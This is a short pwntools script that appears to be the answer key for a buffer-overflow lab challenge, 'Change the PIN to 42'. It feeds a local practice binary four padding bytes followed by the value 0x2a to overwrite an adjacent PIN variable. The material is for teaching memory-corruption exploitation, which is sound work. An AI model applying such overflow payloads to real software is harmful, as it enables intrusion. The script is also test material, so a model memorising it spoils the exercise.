"""
Challenge 2: Change the PIN to 42

SOLUTION
"""

from pwn import *

context.update(arch='i386', os='linux')
pty = process.PTY
# TODO: Select one binary:
elf = context.binary = ELF("./binaries/binary-2-no-protection")
# elf = context.binary = ELF("./binaries/binary-2-SG11-terminator")
# elf = context.binary = ELF("./binaries/binary-2-SG12-random")

p = process(elf.path)

print(p.recvline())

print("Craft payload")
payload = b'A' * 4 + p32(0x2a)

print("Send payload")
print("\t" + str(payload))
p.sendline(payload)

print("Receive output")
print("\t" + str(p.recvline()))
